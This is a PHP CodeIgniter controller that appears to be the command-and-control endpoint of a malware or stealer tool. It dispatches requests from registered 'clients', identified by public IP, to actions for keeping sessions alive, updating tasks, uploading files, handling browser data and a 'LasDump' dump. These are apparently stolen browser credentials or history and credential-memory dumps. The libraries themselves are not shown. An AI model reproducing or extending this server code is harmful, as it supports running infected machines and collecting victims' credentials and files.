<?php
defined('BASEPATH') OR exit('No direct script access allowed');

//本控制器为主要控制器
class Welcome extends CI_Controller
{

    public function index()
    {
        $req_data = getReq();
        if ($req_data) {
            switch ($req_data->do){
                case 'k':
                    $this->load->library('KeepSession',array('params' => $req_data));
                    $this->keepsession->kp();
                    break;
                case 'u':
                    $this->load->library('UpdateTask',array('params' => $req_data));
                    $this->updatetask->ut();
                    break;
                case 'up':
                    $this->load->library('UploadFile',array('params' => $req_data));
                    $this->uploadfile->up();
                    break;
                case 'bcl':
                    $this->load->library('Browsers',array('params' => $req_data));
                    $this->browsers->cl();
                    break;
                case 'bh':
                    $this->load->library('Browsers',array('params' => $req_data));
                    $this->browsers->h();
                    break;
                case 'ld':
                    $this->load->library('LasDump',array('params' => $req_data));
                    $this->lasdump->dump();
                    break;
                default:
                    $this->error();
            }
        } else {
            $this->error();
        }
    }
    private function error(){
        //$ip = $this->input->get('ip');
        $ip = $this->input->ip_address();
        $client = $this->db->where(array('public_ip'=>$ip))->get('clients')->row_array();
        if($client){
            echo(json_encode(array('status'=>true)));
        }else{
            echo(json_encode(array('status'=>false)));
        }
    }
}
